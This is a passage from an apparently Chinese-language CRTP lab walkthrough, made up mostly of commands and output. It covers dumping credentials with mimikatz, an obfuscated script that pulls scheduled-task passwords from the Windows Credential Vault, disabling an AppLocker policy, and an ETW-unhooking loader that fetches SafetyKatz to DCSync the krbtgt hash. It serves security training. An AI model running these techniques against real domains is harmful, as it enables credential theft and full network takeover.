cc098f204c5887eaa8253e7c2749156f</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">996</span> (<span class="number">00000000</span>:<span class="number">000003</span>e4)</span><br><span class="line">Session           : Service from <span class="number">0</span></span><br><span class="line">User Name         : DCORP<span class="literal">-ADMINSRV</span><span class="variable">$</span></span><br><span class="line">Domain            : dcorp</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">16</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">18</span>:<span class="number">49</span> PM</span><br><span class="line">SID               : S<span class="literal">-1-5-20</span></span><br><span class="line"></span><br><span class="line">         * Username : dcorp<span class="literal">-adminsrv</span><span class="variable">$</span></span><br><span class="line">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">         * Password : (null)</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51</span><br><span class="line">           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565</span><br><span class="line">           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565</span><br><span class="line">           rc4_md4           b5f451985fd34d58d5120816d31b5565</span><br><span class="line">           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565</span><br><span class="line">           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">885202</span> (<span class="number">00000000</span>:<span class="number">000</span>d81d2)</span><br><span class="line">Session           : Interactive from <span class="number">2</span></span><br><span class="line">User Name         : UMFD<span class="literal">-2</span></span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">45</span>:<span class="number">01</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-96-0-2</span></span><br><span class="line"></span><br><span class="line">         * Username : DCORP<span class="literal">-ADMINSRV</span><span class="variable">$</span></span><br><span class="line">         * Domain   : dollarcorp.moneycorp.local</span><br><span class="line">         * Password : Q:hFT<span class="string">&#x27;!FUXP6E_2)CK dxm2vl*&#x27;</span>N&gt;a;z<span class="literal">-NIMogeiBtHMtjgw</span><span class="selector-tag">@</span>,Lx:YD.=<span class="string">&quot;5G[e  Y+wN@^44&gt;IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd&#x27;</span></span><br><span class="line"><span class="string">         * Key List :</span></span><br><span class="line"><span class="string">           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff</span></span><br><span class="line"><span class="string">           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593</span></span><br><span class="line"><span class="string">           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string">           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string">           rc4_md4           b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string">           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string">           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Authentication Id : 0 ; 132162 (00000000:00020442)</span></span><br><span class="line"><span class="string">Session           : Service from 0</span></span><br><span class="line"><span class="string">User Name         : appadmin</span></span><br><span class="line"><span class="string">Domain            : dcorp</span></span><br><span class="line"><span class="string">Logon Server      : DCORP-DC</span></span><br><span class="line"><span class="string">Logon Time        : 1/16/2025 11:18:59 PM</span></span><br><span class="line"><span class="string">SID               : S-1-5-21-719815819-3726368948-3917688648-1117</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         * Username : appadmin</span></span><br><span class="line"><span class="string">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span></span><br><span class="line"><span class="string">         * Password : *ActuallyTheWebServer1</span></span><br><span class="line"><span class="string">         * Key List :</span></span><br><span class="line"><span class="string">           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb</span></span><br><span class="line"><span class="string">           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e</span></span><br><span class="line"><span class="string">           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7</span></span><br><span class="line"><span class="string">           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7</span></span><br><span class="line"><span class="string">           rc4_md4           d549831a955fee51a43c83efb3928fa7</span></span><br><span class="line"><span class="string">           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7</span></span><br><span class="line"><span class="string">           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Authentication Id : 0 ; 22517 (00000000:000057f5)</span></span><br><span class="line"><span class="string">Session           : Interactive from 0</span></span><br><span class="line"><span class="string">User Name         : UMFD-0</span></span><br><span class="line"><span class="string">Domain            : Font Driver Host</span></span><br><span class="line"><span class="string">Logon Server      : (null)</span></span><br><span class="line"><span class="string">Logon Time        : 1/16/2025 11:18:49 PM</span></span><br><span class="line"><span class="string">SID               : S-1-5-96-0-0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         * Username : DCORP-ADMINSRV<span class="variable">$</span></span></span><br><span class="line"><span class="string">         * Domain   : dollarcorp.moneycorp.local</span></span><br><span class="line"><span class="string">         * Password : Q:hFT&#x27;!FUXP6E_2)CK dxm2vl*&#x27;N&gt;a;z-NIMogeiBtHMtjgw@,Lx:YD.=&quot;</span><span class="number">5</span>G[<span class="type">e</span>  <span class="type">Y</span>+<span class="type">wN</span><span class="selector-tag">@</span>^<span class="number">44</span>&gt;<span class="type">IT</span>@<span class="type">sd</span>^<span class="type">DxQ4HWRY6</span>%<span class="number">208</span>?<span class="type">lTEbU</span>`u<span class="type">.H0d</span>%<span class="type">zYIW</span>/<span class="type">d</span>@<span class="type">QaT7Ztd</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">         * Key List :</span></span><br><span class="line"><span class="string">           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff</span></span><br><span class="line"><span class="string">           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593</span></span><br><span class="line"><span class="string">           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string">           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string">           rc4_md4           b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string">           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string">           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Authentication Id : 0 ; 22483 (00000000:000057d3)</span></span><br><span class="line"><span class="string">Session           : Interactive from 1</span></span><br><span class="line"><span class="string">User Name         : UMFD-1</span></span><br><span class="line"><span class="string">Domain            : Font Driver Host</span></span><br><span class="line"><span class="string">Logon Server      : (null)</span></span><br><span class="line"><span class="string">Logon Time        : 1/16/2025 11:18:49 PM</span></span><br><span class="line"><span class="string">SID               : S-1-5-96-0-1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         * Username : DCORP-ADMINSRV$</span></span><br><span class="line"><span class="string">         * Domain   : dollarcorp.moneycorp.local</span></span><br><span class="line"><span class="string">         * Password : Q:hFT&#x27;</span>!<span class="type">FUXP6E_2</span>)<span class="type">CK</span> <span class="type">dxm2vl</span>*<span class="string">&#x27;N&gt;a;z-NIMogeiBtHMtjgw@,Lx:YD.=&quot;5G[e  Y+wN@^44&gt;IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd&#x27;</span></span><br><span class="line">         * <span class="type">Key</span> <span class="type">List</span> :</span><br><span class="line">           <span class="type">aes256_hmac</span>       <span class="number">82</span><span class="type">ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff</span></span><br><span class="line">           <span class="type">aes128_hmac</span>       <span class="number">3</span><span class="type">f3532b2260c2851bf57e8b5573f7593</span></span><br><span class="line">           <span class="type">rc4_hmac_nt</span>       <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line">           <span class="type">rc4_hmac_old</span>      <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line">           <span class="type">rc4_md4</span>           <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line">           <span class="type">rc4_hmac_nt_exp</span>   <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line">           <span class="type">rc4_hmac_old_exp</span>  <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line"></span><br><span class="line"><span class="type">Authentication</span> <span class="type">Id</span> : <span class="number">0</span> ; <span class="number">999</span> (<span class="number">00000000</span>:<span class="number">000003</span><span class="type">e7</span>)</span><br><span class="line"><span class="type">Session</span>           : <span class="type">UndefinedLogonType</span> <span class="type">from</span> <span class="number">0</span></span><br><span class="line"><span class="type">User</span> <span class="type">Name</span>         : <span class="type">DCORP</span>-<span class="type">ADMINSRV</span><span class="variable">$</span></span><br><span class="line"><span class="type">Domain</span>            : <span class="type">dcorp</span></span><br><span class="line"><span class="type">Logon</span> <span class="type">Server</span>      : (<span class="type">null</span>)</span><br><span class="line"><span class="type">Logon</span> <span class="type">Time</span>        : <span class="number">1</span>/<span class="number">16</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">18</span>:<span class="number">49</span> <span class="type">PM</span></span><br><span class="line"><span class="type">SID</span>               : <span class="type">S</span>-<span class="number">1</span>-<span class="number">5</span>-<span class="number">18</span></span><br><span class="line"></span><br><span class="line">         * <span class="type">Username</span> : <span class="type">dcorp</span>-<span class="type">adminsrv</span><span class="variable">$</span></span><br><span class="line">         * <span class="type">Domain</span>   : <span class="type">DOLLARCORP.MONEYCORP.LOCAL</span></span><br><span class="line">         * <span class="type">Password</span> : (<span class="type">null</span>)</span><br><span class="line">         * <span class="type">Key</span> <span class="type">List</span> :</span><br><span class="line">           <span class="type">aes256_hmac</span>       <span class="type">e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51</span></span><br><span class="line">           <span class="type">rc4_hmac_nt</span>       <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line">           <span class="type">rc4_hmac_old</span>      <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line">           <span class="type">rc4_md4</span>           <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line">           <span class="type">rc4_hmac_nt_exp</span>   <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br><span class="line">           <span class="type">rc4_hmac_old_exp</span>  <span class="type">b5f451985fd34d58d5120816d31b5565</span></span><br></pre></td></tr></table></figure>

<p>注意这里有个srvadmin的用户，其实是计划任务的账户，可以枚举当前主机的计划任务看到这个账户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ScheduledTask</span> | <span class="built_in">Select-Object</span> TaskName, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;RunAsUser&quot;</span>; Expression = &#123;<span class="variable">$_</span>.Principal.UserId&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>或者通过看 <code>C:\Windows\System32\Tasks\</code> 目录也可能看到</p>
<p>其中有个 <code>Browse</code> 的任务是以他的 <code>服务账户</code> 来运行的，而这种 <code>计划任务</code> 的 <code>服务账户</code> 的密码凭证<strong>在服务运行时</strong>，会把 <code>明文</code> 写到 <code>Windows Credential Vault</code>即 Windows 凭据保管库，这里的凭据也是用dpapi加密的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\windows&gt;  Get-ScheduledTask | Select-Object TaskName, @&#123;Name=&quot;RunAsUser&quot;; Expression = &#123;$_.Principal.UserId&#125;&#125;</span><br><span class="line"></span><br><span class="line">TaskName                                             RunAsUser</span><br><span class="line">--------                                             ---------</span><br><span class="line">Browse                                               srvadmin</span><br><span class="line">.NET Framework NGEN v4.0.30319                       SYSTEM</span><br></pre></td></tr></table></figure>

<p>常规来说，凭据和vault通常存储在下面这俩位置，不过这里计划任务的我</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;用户名&gt;\AppData\Local\Microsoft\Vault\</span><br><span class="line">C:\Users\&lt;用户名&gt;\AppData\Roaming\Microsoft\Credentials\</span><br></pre></td></tr></table></figure>

<p>既然 sekurlsa::keys 是从 <code>lsass</code> 导出凭据，那从 <code>credential vault</code> 导就要用 <code>vault::cred</code></p>
<p>同样还是这个脚本，改成vault的，记得运行时候提升到system，不然容易没权限访问，这脚本的command参数记得两边包单引号。</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-28.png" alt="alt text"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$1</span> = <span class="string">&quot;t&quot;</span></span><br><span class="line"><span class="variable">$2</span> = <span class="string">&quot;o&quot;</span></span><br><span class="line"><span class="variable">$3</span> = <span class="string">&quot;k&quot;</span></span><br><span class="line"><span class="variable">$4</span> = <span class="string">&quot;e&quot;</span></span><br><span class="line"><span class="variable">$5</span> = <span class="string">&quot;n&quot;</span></span><br><span class="line"><span class="variable">$6</span> = <span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="variable">$7</span> = <span class="string">&quot;e&quot;</span></span><br><span class="line"><span class="variable">$8</span> = <span class="string">&quot;l&quot;</span></span><br><span class="line"><span class="variable">$9</span> = <span class="string">&quot;v&quot;</span></span><br><span class="line"><span class="variable">$10</span> = <span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="variable">$11</span> = <span class="string">&quot;t&quot;</span></span><br><span class="line"><span class="variable">$12</span> = <span class="string">&quot;vault&quot;</span></span><br><span class="line"><span class="variable">$13</span> = <span class="string">&quot;cred&quot;</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;/patch&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd1</span> = <span class="variable">$1</span> + <span class="variable">$2</span> + <span class="variable">$3</span> + <span class="variable">$4</span> + <span class="variable">$5</span> + <span class="variable">$6</span> + <span class="variable">$6</span> + <span class="variable">$7</span> + <span class="variable">$8</span> + <span class="variable">$7</span> + <span class="variable">$9</span> + <span class="variable">$10</span> + <span class="variable">$11</span> + <span class="variable">$7</span></span><br><span class="line"><span class="variable">$cmd2</span> = <span class="variable">$12</span> + <span class="variable">$6</span> + <span class="variable">$6</span> + <span class="variable">$13</span> + <span class="string">&quot; &quot;</span> + <span class="variable">$b</span>    </span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Mimi</span> <span class="literal">-Command</span> (<span class="string">&#x27;&quot;&#x27;</span> + <span class="variable">$cmd1</span> + <span class="string">&#x27;&quot; &quot;&#x27;</span> + <span class="variable">$cmd2</span> + <span class="string">&#x27;&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>落地然后运行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\windows&gt; <span class="built_in">curl</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/mimi<span class="literal">-vault</span>.ps1 <span class="literal">-o</span> v.ps1</span><br><span class="line"><span class="built_in">curl</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/mimi<span class="literal">-vault</span>.ps1 <span class="literal">-o</span> v.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\windows&gt; ps1</span><br><span class="line">.\v.ps1</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 May 23 2024 17:47:47</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(powershell) <span class="comment"># token::elevate</span></span><br><span class="line">Token Id  : <span class="number">0</span></span><br><span class="line">User name :</span><br><span class="line">SID name  : NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line"><span class="number">600</span>     &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">17442</span>          NT AUTHORITY\SYSTEM     S<span class="literal">-1-5-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Primary</span><br><span class="line"> -&gt; Impersonated !</span><br><span class="line"> * <span class="keyword">Process</span> Token : &#123;<span class="number">0</span>;<span class="number">004</span>b9082&#125; <span class="number">0</span> D <span class="number">5042622</span>     dcorp\svcadmin  S<span class="literal">-1-5-21-719815819-3726368948-3917688648-1118</span>   (<span class="number">11</span>g,<span class="number">24</span>p)       Primary</span><br><span class="line"> * Thread Token  : &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">8235591</span>     NT AUTHORITY\SYSTEM     S<span class="literal">-1-5-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Impersonation (Delegation)</span><br><span class="line"></span><br><span class="line">mimikatz(powershell) <span class="comment"># vault::cred /patch</span></span><br><span class="line">TargetName : Domain:batch=TaskScheduler:Task:&#123;D1FE8F15<span class="literal">-FC32-486B-94BC-471E4B1C1BB9</span>&#125; / &lt;NULL&gt;</span><br><span class="line">UserName   : dcorp\srvadmin</span><br><span class="line">Comment    : &lt;NULL&gt;</span><br><span class="line"><span class="built_in">Type</span>       : <span class="number">2</span> - domain_password</span><br><span class="line">Persist    : <span class="number">2</span> - local_machine</span><br><span class="line">Flags      : <span class="number">00004004</span></span><br><span class="line">Credential : TheKeyUs3ron@anyMachine!</span><br><span class="line">Attributes : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-29.png" alt="alt text"></p>
<p>就从 <code>vault</code> 中得到了服务账户 <code>srvadmin</code> 密码了（</p>
<p>因为是从vault凭据库中提取的计划任务账户凭据，所以flag是 <code>Credential Vault</code></p>
<h2 id="Learning-Objective-7-4"><a href="#Learning-Objective-7-4" class="headerlink" title="Learning Objective - 7 - 4"></a>Learning Objective - 7 - 4</h2><blockquote>
<p>NTLM hash of srvadmin extracted from dcorp-adminsrv</p>
</blockquote>
<blockquote>
<p>从dcorp-adminsrv上提取srvadmin的ntlmhash</p>
</blockquote>
<p>上面7-3已经提取过了，所以flag是 <code>a98e18228819e8eec3dfa33cb68b0728</code></p>
<h2 id="Learning-Objective-7-5"><a href="#Learning-Objective-7-5" class="headerlink" title="Learning Objective - 7 - 5"></a>Learning Objective - 7 - 5</h2><blockquote>
<p>NTLM hash of websvc extracted from dcorp-adminsrv</p>
</blockquote>
<blockquote>
<p>从dcorp-adminsrv上提取websvc的ntlmhash</p>
</blockquote>
<p>同样的，7-3已经提取到了，flag为 <code>cc098f204c5887eaa8253e7c2749156f</code></p>
<h2 id="Learning-Objective-7-6"><a href="#Learning-Objective-7-6" class="headerlink" title="Learning Objective - 7 - 6"></a>Learning Objective - 7 - 6</h2><blockquote>
<p>NTLM hash of appadmin extracted from dcorp-adminsrv</p>
</blockquote>
<blockquote>
<p>从dcorp-adminsrv上提取appadmin的ntlmhash</p>
</blockquote>
<p>同样7-3拿到了，flag <code>d549831a955fee51a43c83efb3928fa7</code></p>
<h2 id="关闭applocker"><a href="#关闭applocker" class="headerlink" title="关闭applocker"></a>关闭applocker</h2><p>尝试把域的那个applocker策略给他扬了</p>
<p>所以用域管账户做一下，这里我进程注入的svcamin票据，所以用它权限自然是够的，不过枚举时候可以看到student用户本身就对applocker这个组策略有修改权限，所以喜欢那个用哪个了。</p>
<p>摇出来组策略控制台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpmc.msc</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-30.png" alt="alt text"></p>
<p>找到applocker这个gpo对他右键，选中 <code>edit</code> 编辑</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-31.png" alt="alt text"></p>
<p>然后把这条应用的目前启用的执行策略给他扬了</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-32.png" alt="alt text"></p>
<p>回到刚才开了applocker的 <code>dcorp-adminsrv</code> 机器，刷新组策略</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate</span><br></pre></td></tr></table></figure>

<p>然后执行刚才不让执行的exe程式，现在就可以执行了。</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-33.png" alt="alt text"></p>
<h2 id="Learning-Objective-8-1"><a href="#Learning-Objective-8-1" class="headerlink" title="Learning Objective - 8 - 1"></a>Learning Objective - 8 - 1</h2><blockquote>
<p>NTLM hash of krbtgt</p>
</blockquote>
<blockquote>
<p>krbtgt的ntlm</p>
</blockquote>
<p>有域管账户了，直接用svcadmin账户dcsync导一下krbtgt的hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; .\loader.exe -path http://127.0.0.1:8080/safetykatz.exe -args &quot;lsadump::evasive-dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : http://127.0.0.1:8080/safetykatz.exe Arguments : lsadump::evasive-dcsync /user:dcorp\krbtgt exit</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt</span><br><span class="line">[DC] &#x27;dollarcorp.moneycorp.local&#x27; will be the domain</span><br><span class="line">[DC] &#x27;dcorp-dc.dollarcorp.moneycorp.local&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;dcorp\krbtgt&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 11/11/2022 10:59:41 PM</span><br><span class="line">Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986</span><br><span class="line">    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986</span><br><span class="line">    lm  - 0: ea03581a1268674a828bde6ab09db837</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848</span><br><span class="line">      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e</span><br><span class="line">      des_cbc_md5       (4096) : 150ea2e934ab6b80</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : 150ea2e934ab6b80</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  a0e60e247b498de4cacfac3ba615af01</span><br><span class="line">    02  86615bb9bf7e3c731ba1cb47aa89cf6d</span><br><span class="line">    03  637dfb61467fdb4f176fe844fd260bac</span><br><span class="line">    04  a0e60e247b498de4cacfac3ba615af01</span><br><span class="line">    05  86615bb9bf7e3c731ba1cb47aa89cf6d</span><br><span class="line">    06  d2874f937df1fd2b05f528c6e715ac7a</span><br><span class="line">    07  a0e60e247b498de4cacfac3ba615af01</span><br><span class="line">    08  e8ddc0d55ac23e847837791743b89d22</span><br><span class="line">    09  e8ddc0d55ac23e847837791743b89d22</span><br><span class="line">    10  